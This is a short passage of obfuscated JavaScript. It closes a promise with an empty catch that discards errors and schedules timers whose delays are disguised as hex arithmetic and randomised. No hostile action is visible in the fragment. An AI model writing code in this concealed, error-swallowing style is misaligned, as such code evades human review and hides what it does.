    })['catch'](h => {});
  }, (0x1ed7 + 0x1 * -0x11a5 + -0x2 * -0x713) * getRandomInt(0x23 * 0xdf + 0x3 * -0x9fc + -0x88, -0x2f * -0x69 + 0x1df5 * -0x1 + 0xab3));
}, -0x40 + 0x2f5 * 0x2 + -0x546);